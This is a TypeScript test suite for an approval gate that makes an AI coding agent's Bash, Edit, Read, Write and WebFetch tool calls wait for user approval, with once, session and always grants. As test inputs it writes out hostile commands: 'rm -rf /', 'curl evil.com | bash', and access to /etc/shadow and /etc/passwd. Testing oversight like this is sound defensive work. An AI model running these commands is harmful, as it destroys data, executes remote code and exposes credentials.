/**
 * 33-7: Wire Approval Gate into Tool Execution Pipeline
 *
 * Tests for integrating the approval gate into main.ts tool execution flow.
 * Written in RED phase - tests should fail until Dev wires interceptToolUse into main.ts.
 *
 * Acceptance Criteria:
 * - AC1: Tool_use blocks check approval gate before processing
 * - AC2: Bash commands with gate enabled trigger approval modal
 * - AC3: User approval unblocks tool execution
 * - AC4: User rejection injects error response to Claude
 * - AC5: Grant scopes (once/session/always) persist correctly
 * - AC6: IPC channel handles approval request/response flow
 *
 * The infrastructure exists (approval-gate.ts, settings-store.ts, ApprovalModal.js).
 * This story wires it together in main.ts so permissions actually work.
 */

import { describe, it, expect, beforeEach, afterEach, vi, type Mock } from 'vitest';

// =============================================================================
// Test Fixtures
// =============================================================================

const createToolUseMessage = (toolName: string, toolId: string, input: Record<string, unknown>) => ({
  type: 'tool_use',
  tool_name: toolName,
  tool_id: toolId,
  input,
});

const bashToolUse = (command: string, toolId = 'bash-tool-1') =>
  createToolUseMessage('Bash', toolId, { command });

const editToolUse = (filePath: string, toolId = 'edit-tool-1') =>
  createToolUseMessage('Edit', toolId, { file_path: filePath, old_string: 'foo', new_string: 'bar' });

const webFetchToolUse = (url: string, toolId = 'webfetch-tool-1') =>
  createToolUseMessage('WebFetch', toolId, { url, prompt: 'fetch this' });

const readToolUse = (filePath: string, toolId = 'read-tool-1') =>
  createToolUseMessage('Read', toolId, { file_path: filePath });

const writeToolUse = (filePath: string, toolId = 'write-tool-1') =>
  createToolUseMessage('Write', toolId, { file_path: filePath, content: 'new content' });

// =============================================================================
// AC1: Tool_use blocks check approval gate before processing
// =============================================================================
describe('AC1: Tool_use blocks check approval gate before processing', () => {
  beforeEach(async () => {
    vi.resetModules();
  });

  describe('main.ts exports approval gate integration', () => {
    it('should export processToolUseWithApproval function', async () => {
      // This function should be added to main.ts to wrap tool_use processing
      const main = await import('../src/main.js');

      expect(main.processToolUseWithApproval).toBeDefined();
      expect(typeof main.processToolUseWithApproval).toBe('function');
    });

    it('should call interceptToolUse for every tool_use message', async () => {
      const approvalGate = await import('../src/approval-gate.js');
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const interceptSpy = vi.spyOn(approvalGate, 'interceptToolUse');

      const message = bashToolUse('echo hello', 'bash-intercept');
      const approvalPromise = main.processToolUseWithApproval(message);

      // interceptToolUse should be called immediately
      expect(interceptSpy).toHaveBeenCalledWith(message);

      // Resolve approval to unblock the promise
      approvalGate.resolveApproval('bash-intercept', true, 'once');
      await approvalPromise;

      settingsStore.setBashApprovalGate(false);
    });

    it('should check approval gate for Bash tool_use', async () => {
      const approvalGate = await import('../src/approval-gate.js');
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-check-1';
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('rm -rf /', toolId));

      // Resolve with approval to get result
      approvalGate.resolveApproval(toolId, true, 'once');
      const result = await approvalPromise;

      // Should indicate approval was needed (even though we approved)
      expect(result.needsApproval).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should check approval gate for Edit tool_use', async () => {
      const approvalGate = await import('../src/approval-gate.js');
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'edit-check-1';
      const approvalPromise = main.processToolUseWithApproval(editToolUse('/etc/passwd', toolId));

      approvalGate.resolveApproval(toolId, true, 'once');
      const result = await approvalPromise;

      expect(result.needsApproval).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should check approval gate for WebFetch tool_use', async () => {
      const approvalGate = await import('../src/approval-gate.js');
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'webfetch-check-1';
      const approvalPromise = main.processToolUseWithApproval(webFetchToolUse('https://evil.com', toolId));

      approvalGate.resolveApproval(toolId, true, 'once');
      const result = await approvalPromise;

      expect(result.needsApproval).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should check approval gate for Read tool_use', async () => {
      const approvalGate = await import('../src/approval-gate.js');
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'read-check-1';
      const approvalPromise = main.processToolUseWithApproval(readToolUse('/etc/shadow', toolId));

      approvalGate.resolveApproval(toolId, true, 'once');
      const result = await approvalPromise;

      expect(result.needsApproval).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should check approval gate for Write tool_use', async () => {
      const approvalGate = await import('../src/approval-gate.js');
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'write-check-1';
      const approvalPromise = main.processToolUseWithApproval(writeToolUse('/etc/passwd', toolId));

      approvalGate.resolveApproval(toolId, true, 'once');
      const result = await approvalPromise;

      expect(result.needsApproval).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });
  });

  describe('gate disabled behavior', () => {
    it('should pass through when gate is disabled', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(false);

      const result = await main.processToolUseWithApproval(bashToolUse('rm -rf /'));

      expect(result.needsApproval).toBe(false);
      expect(result.passThrough).toBe(true);
    });
  });

  describe('grant matching behavior', () => {
    it('should pass through when matching grant exists', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      // Add grant for git commands
      settingsStore.addGrant({
        tool: 'Bash',
        scope: 'git *',
        grant_type: 'session',
        granted_at: new Date().toISOString(),
      });

      const result = await main.processToolUseWithApproval(bashToolUse('git status'));

      expect(result.needsApproval).toBe(false);
      expect(result.passThrough).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });
  });
});

// =============================================================================
// AC2: Bash commands with gate enabled trigger approval modal
// =============================================================================
describe('AC2: Bash commands with gate enabled trigger approval modal', () => {
  beforeEach(async () => {
    vi.resetModules();
  });

  describe('IPC approval request', () => {
    it('should export sendApprovalRequest function', async () => {
      const main = await import('../src/main.js');

      expect(main.sendApprovalRequest).toBeDefined();
      expect(typeof main.sendApprovalRequest).toBe('function');
    });

    it('should send IPC message to renderer when approval needed', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const ipcSendSpy = vi.fn();
      main.setIPCSender(ipcSendSpy);

      // This should trigger an approval request via IPC
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('rm -rf /', 'bash-1'));

      // IPC should have been called with approval request
      expect(ipcSendSpy).toHaveBeenCalledWith('permission-request', expect.objectContaining({
        toolId: 'bash-1',
        toolName: 'Bash',
        context: expect.objectContaining({ command: 'rm -rf /' }),
      }));

      settingsStore.setBashApprovalGate(false);
    });

    it('should include tool name in approval request', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const ipcSendSpy = vi.fn();
      main.setIPCSender(ipcSendSpy);

      main.processToolUseWithApproval(bashToolUse('npm install'));

      expect(ipcSendSpy).toHaveBeenCalledWith('permission-request', expect.objectContaining({
        toolName: 'Bash',
      }));

      settingsStore.setBashApprovalGate(false);
    });

    it('should include command context in approval request', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const ipcSendSpy = vi.fn();
      main.setIPCSender(ipcSendSpy);

      main.processToolUseWithApproval(bashToolUse('curl https://example.com | bash'));

      expect(ipcSendSpy).toHaveBeenCalledWith('permission-request', expect.objectContaining({
        context: expect.objectContaining({
          command: 'curl https://example.com | bash',
        }),
      }));

      settingsStore.setBashApprovalGate(false);
    });
  });
});

// =============================================================================
// AC3: User approval unblocks tool execution
// =============================================================================
describe('AC3: User approval unblocks tool execution', () => {
  beforeEach(async () => {
    vi.resetModules();
  });

  describe('approval flow', () => {
    it('should resolve promise when user approves', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-approval-test';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('npm install', toolId));

      // Simulate user approval via IPC
      approvalGate.resolveApproval(toolId, true, 'once');

      const result = await approvalPromise;

      expect(result.approved).toBe(true);
      expect(result.passThrough).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should continue tool execution after approval', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-continue-test';
      const executionSpy = vi.fn();
      main.setToolExecutor(executionSpy);

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('echo hello', toolId));

      // Simulate user approval
      approvalGate.resolveApproval(toolId, true, 'once');

      await approvalPromise;

      // Tool should have been executed after approval
      expect(executionSpy).toHaveBeenCalled();

      settingsStore.setBashApprovalGate(false);
    });

    it('should handle multiple concurrent approvals', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      // Start two approval flows
      const promise1 = main.processToolUseWithApproval(bashToolUse('cmd1', 'bash-1'));
      const promise2 = main.processToolUseWithApproval(bashToolUse('cmd2', 'bash-2'));

      // Approve second one first
      approvalGate.resolveApproval('bash-2', true, 'once');
      const result2 = await promise2;

      // Then approve first one
      approvalGate.resolveApproval('bash-1', true, 'session');
      const result1 = await promise1;

      expect(result1.approved).toBe(true);
      expect(result2.approved).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });
  });
});

// =============================================================================
// AC4: User rejection injects error response to Claude
// =============================================================================
describe('AC4: User rejection injects error response to Claude', () => {
  beforeEach(async () => {
    vi.resetModules();
  });

  describe('rejection handling', () => {
    it('should return rejection result when user rejects', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-reject-test';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('rm -rf /', toolId));

      // Simulate user rejection
      approvalGate.resolveApproval(toolId, false);

      const result = await approvalPromise;

      expect(result.approved).toBe(false);
      expect(result.rejected).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should create tool_result error for rejected commands', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-error-test';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('rm -rf /', toolId));

      // Simulate user rejection
      approvalGate.resolveApproval(toolId, false);

      const result = await approvalPromise;

      // Should have error message to inject
      expect(result.errorMessage).toBeDefined();
      expect(result.errorMessage.type).toBe('tool_result');
      expect(result.errorMessage.tool_id).toBe(toolId);
      expect(result.errorMessage.is_error).toBe(true);
      expect(result.errorMessage.output).toContain('rejected');

      settingsStore.setBashApprovalGate(false);
    });

    it('should inject error into Claude conversation', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-inject-test';
      const injectSpy = vi.fn();
      main.setErrorInjector(injectSpy);

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('rm -rf /', toolId));

      // Simulate user rejection
      approvalGate.resolveApproval(toolId, false);

      await approvalPromise;

      // Error should have been injected
      expect(injectSpy).toHaveBeenCalledWith(expect.objectContaining({
        type: 'tool_result',
        tool_id: toolId,
        is_error: true,
      }));

      settingsStore.setBashApprovalGate(false);
    });

    it('should NOT execute tool after rejection', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-no-exec-test';
      const executionSpy = vi.fn();
      main.setToolExecutor(executionSpy);

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('rm -rf /', toolId));

      // Simulate user rejection
      approvalGate.resolveApproval(toolId, false);

      await approvalPromise;

      // Tool should NOT have been executed
      expect(executionSpy).not.toHaveBeenCalled();

      settingsStore.setBashApprovalGate(false);
    });
  });
});

// =============================================================================
// AC5: Grant scopes (once/session/always) persist correctly
// =============================================================================
describe('AC5: Grant scopes (once/session/always) persist correctly', () => {
  beforeEach(async () => {
    vi.resetModules();
  });

  describe('grant creation on approval', () => {
    it('should create once grant when user chooses "Allow Once"', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-once-grant';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('npm test', toolId));

      // Simulate user approval with "once" scope
      approvalGate.resolveApproval(toolId, true, 'once');

      await approvalPromise;

      // Grant should have been created
      const grants = settingsStore.getGrants();
      const onceGrant = grants.find(g => g.grant_type === 'once');
      expect(onceGrant).toBeDefined();

      settingsStore.setBashApprovalGate(false);
    });

    it('should create session grant when user chooses "Allow Session"', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-session-grant';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('npm install', toolId));

      // Simulate user approval with "session" scope
      approvalGate.resolveApproval(toolId, true, 'session');

      await approvalPromise;

      // Grant should have been created
      const grants = settingsStore.getGrants();
      const sessionGrant = grants.find(g => g.grant_type === 'session');
      expect(sessionGrant).toBeDefined();

      settingsStore.setBashApprovalGate(false);
    });

    it('should create always grant when user chooses "Always Allow"', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-always-grant';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('git status', toolId));

      // Simulate user approval with "always" scope
      approvalGate.resolveApproval(toolId, true, 'always');

      await approvalPromise;

      // Grant should have been created
      const grants = settingsStore.getGrants();
      const alwaysGrant = grants.find(g => g.grant_type === 'always');
      expect(alwaysGrant).toBeDefined();

      settingsStore.setBashApprovalGate(false);
    });

    it('should persist always grants via callback', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const approvalGate = await import('../src/approval-gate.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const persistSpy = vi.fn();
      settingsStore.setGrantsPersistCallback(persistSpy);

      const toolId = 'bash-persist-test';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('git push', toolId));

      // Simulate user approval with "always" scope
      approvalGate.resolveApproval(toolId, true, 'always');

      await approvalPromise;

      // Persist callback should have been called
      expect(persistSpy).toHaveBeenCalled();

      settingsStore.setBashApprovalGate(false);
    });
  });

  describe('grant consumption', () => {
    it('should auto-revoke once grant after use', async () => {
      const approvalGate = await import('../src/approval-gate.js');
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      // Add once grant
      settingsStore.addGrant({
        tool: 'Bash',
        scope: 'npm *',
        grant_type: 'once',
        granted_at: new Date().toISOString(),
      });

      // First use - should pass through (grant exists)
      const result1 = await main.processToolUseWithApproval(bashToolUse('npm test', 'bash-1'));
      expect(result1.passThrough).toBe(true);

      // Second use - grant consumed, should need approval
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('npm install', 'bash-2'));

      // Resolve approval to unblock
      approvalGate.resolveApproval('bash-2', true, 'once');
      const result2 = await approvalPromise;

      expect(result2.needsApproval).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should NOT revoke session grant after use', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      // Add session grant
      settingsStore.addGrant({
        tool: 'Bash',
        scope: 'npm *',
        grant_type: 'session',
        granted_at: new Date().toISOString(),
      });

      // Multiple uses - should all pass through
      const result1 = await main.processToolUseWithApproval(bashToolUse('npm test', 'bash-1'));
      const result2 = await main.processToolUseWithApproval(bashToolUse('npm install', 'bash-2'));
      const result3 = await main.processToolUseWithApproval(bashToolUse('npm run build', 'bash-3'));

      expect(result1.passThrough).toBe(true);
      expect(result2.passThrough).toBe(true);
      expect(result3.passThrough).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should NOT revoke always grant after use', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      // Add always grant
      settingsStore.addGrant({
        tool: 'Bash',
        scope: 'git *',
        grant_type: 'always',
        granted_at: new Date().toISOString(),
      });

      // Multiple uses - should all pass through
      const result1 = await main.processToolUseWithApproval(bashToolUse('git status', 'bash-1'));
      const result2 = await main.processToolUseWithApproval(bashToolUse('git commit', 'bash-2'));
      const result3 = await main.processToolUseWithApproval(bashToolUse('git push', 'bash-3'));

      expect(result1.passThrough).toBe(true);
      expect(result2.passThrough).toBe(true);
      expect(result3.passThrough).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });
  });
});

// =============================================================================
// AC6: IPC channel handles approval request/response flow
// =============================================================================
describe('AC6: IPC channel handles approval request/response flow', () => {
  beforeEach(async () => {
    vi.resetModules();
  });

  describe('IPC handler registration', () => {
    it('should export setupApprovalIPCHandlers function', async () => {
      const main = await import('../src/main.js');

      expect(main.setupApprovalIPCHandlers).toBeDefined();
      expect(typeof main.setupApprovalIPCHandlers).toBe('function');
    });

    it('should register handler for permission-response channel', async () => {
      const main = await import('../src/main.js');

      const mockIpcMain = {
        handle: vi.fn(),
        on: vi.fn(),
      };

      main.setupApprovalIPCHandlers(mockIpcMain);

      // Should have registered a handler for permission responses
      const handleCalls = mockIpcMain.handle.mock.calls.concat(mockIpcMain.on.mock.calls);
      const permissionHandler = handleCalls.find(call => call[0] === 'permission-response');

      expect(permissionHandler).toBeDefined();
    });
  });

  describe('IPC response handling', () => {
    it('should resolve pending approval on IPC response', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-ipc-test';

      // Mock IPC sender
      const ipcSendSpy = vi.fn();
      main.setIPCSender(ipcSendSpy);

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('npm test', toolId));

      // Simulate IPC response from renderer
      main.handlePermissionResponse({
        toolId,
        approved: true,
        grantScope: 'session',
      });

      const result = await approvalPromise;

      expect(result.approved).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should handle rejection via IPC response', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-ipc-reject';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('rm -rf /', toolId));

      // Simulate IPC rejection from renderer
      main.handlePermissionResponse({
        toolId,
        approved: false,
      });

      const result = await approvalPromise;

      expect(result.approved).toBe(false);
      expect(result.rejected).toBe(true);

      settingsStore.setBashApprovalGate(false);
    });

    it('should include grantScope in IPC response handling', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-ipc-scope';

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('git status', toolId));

      // Simulate IPC response with always scope
      main.handlePermissionResponse({
        toolId,
        approved: true,
        grantScope: 'always',
      });

      await approvalPromise;

      // Grant should have been created with correct scope
      const grants = settingsStore.getGrants();
      const alwaysGrant = grants.find(g => g.grant_type === 'always');
      expect(alwaysGrant).toBeDefined();

      settingsStore.setBashApprovalGate(false);
    });
  });

  describe('bidirectional IPC flow', () => {
    it('should complete full request-response cycle', async () => {
      const settingsStore = await import('../src/settings-store.js');
      const main = await import('../src/main.js');

      settingsStore.setBashApprovalGate(true);
      settingsStore.clearAllGrants();

      const toolId = 'bash-full-cycle';
      const executionSpy = vi.fn();
      const ipcSendSpy = vi.fn();

      main.setToolExecutor(executionSpy);
      main.setIPCSender(ipcSendSpy);

      // Start approval flow
      const approvalPromise = main.processToolUseWithApproval(bashToolUse('npm test', toolId));

      // Verify IPC request was sent
      expect(ipcSendSpy).toHaveBeenCalledWith('permission-request', expect.objectContaining({
        toolId,
      }));

      // Simulate IPC response
      main.handlePermissionResponse({
        toolId,
        approved: true,
        grantScope: 'session',
      });

      const result = await approvalPromise;

      // Verify approval completed
      expect(result.approved).toBe(true);

      // Verify tool execution triggered
      expect(executionSpy).toHaveBeenCalled();

      settingsStore.setBashApprovalGate(false);
    });
  });
});

// =============================================================================
// Integration: Full approval flow
// =============================================================================
describe('Integration: Full approval flow', () => {
  beforeEach(async () => {
    vi.resetModules();
  });

  it('should handle complete approval workflow for dangerous command', async () => {
    const approvalGate = await import('../src/approval-gate.js');
    const settingsStore = await import('../src/settings-store.js');
    const main = await import('../src/main.js');

    settingsStore.setBashApprovalGate(true);
    settingsStore.clearAllGrants();

    const toolId = 'bash-dangerous';
    const ipcSendSpy = vi.fn();
    const executionSpy = vi.fn();

    main.setIPCSender(ipcSendSpy);
    main.setToolExecutor(executionSpy);

    // Step 1: Process dangerous command
    const approvalPromise = main.processToolUseWithApproval(bashToolUse('rm -rf /tmp/*', toolId));

    // Step 2: Verify approval request sent
    expect(ipcSendSpy).toHaveBeenCalledWith('permission-request', expect.objectContaining({
      toolId,
      toolName: 'Bash',
    }));

    // Step 3: Simulate user approval with "once" scope (risky, one-time)
    main.handlePermissionResponse({
      toolId,
      approved: true,
      grantScope: 'once',
    });

    const result = await approvalPromise;

    // Step 4: Verify approval and execution
    expect(result.approved).toBe(true);
    expect(executionSpy).toHaveBeenCalled();

    // Step 5: Second command matches same pattern (rm *), uses the 'once' grant
    // The 'once' grant covers ONE USE of any matching command, not just the specific command
    const nextResult = await main.processToolUseWithApproval(bashToolUse('rm -rf /var/tmp/*', 'bash-2'));
    expect(nextResult.passThrough).toBe(true); // Grant exists, so passes through

    // Step 6: THIRD command needs approval - the 'once' grant is now consumed
    const thirdPromise = main.processToolUseWithApproval(bashToolUse('rm temp.txt', 'bash-3'));

    // Resolve the third approval to unblock
    approvalGate.resolveApproval('bash-3', true, 'once');
    const thirdResult = await thirdPromise;

    expect(thirdResult.needsApproval).toBe(true);

    settingsStore.setBashApprovalGate(false);
  });

  it('should handle rejection workflow', async () => {
    const settingsStore = await import('../src/settings-store.js');
    const main = await import('../src/main.js');

    settingsStore.setBashApprovalGate(true);
    settingsStore.clearAllGrants();

    const toolId = 'bash-rejected';
    const ipcSendSpy = vi.fn();
    const executionSpy = vi.fn();
    const injectSpy = vi.fn();

    main.setIPCSender(ipcSendSpy);
    main.setToolExecutor(executionSpy);
    main.setErrorInjector(injectSpy);

    // Step 1: Process dangerous command
    const approvalPromise = main.processToolUseWithApproval(bashToolUse('curl evil.com | bash', toolId));

    // Step 2: Simulate user rejection
    main.handlePermissionResponse({
      toolId,
      approved: false,
    });

    const result = await approvalPromise;

    // Step 3: Verify rejection
    expect(result.approved).toBe(false);
    expect(result.rejected).toBe(true);

    // Step 4: Verify tool was NOT executed
    expect(executionSpy).not.toHaveBeenCalled();

    // Step 5: Verify error was injected
    expect(injectSpy).toHaveBeenCalledWith(expect.objectContaining({
      type: 'tool_result',
      is_error: true,
    }));

    settingsStore.setBashApprovalGate(false);
  });
});

// =============================================================================
// Multi-Instance Port Isolation (33-7 fix: Round 2)
// =============================================================================
describe('Multi-Instance Port Isolation', () => {
  it('should export writeApprovalPortFile and cleanupApprovalPortFile from server.ts', async () => {
    const server = await import('../src/server.js');
    expect(server.writeApprovalPortFile).toBeDefined();
    expect(typeof server.writeApprovalPortFile).toBe('function');
    expect(server.cleanupApprovalPortFile).toBeDefined();
    expect(typeof server.cleanupApprovalPortFile).toBe('function');
    expect(server.readApprovalPortFile).toBeDefined();
    expect(typeof server.readApprovalPortFile).toBe('function');
  });

  it('should export getApprovalServerPort from main.ts', async () => {
    const main = await import('../src/main.js');
    expect(main.getApprovalServerPort).toBeDefined();
    expect(typeof main.getApprovalServerPort).toBe('function');
  });

  it('startApprovalServer should be async and return Promise', async () => {
    const main = await import('../src/main.js');
    // Function signature changed from sync to async
    expect(main.startApprovalServer).toBeDefined();
    // The function should return a Promise (async function)
    const result = main.startApprovalServer();
    expect(result).toBeInstanceOf(Promise);
    await result; // Clean up
  });
});
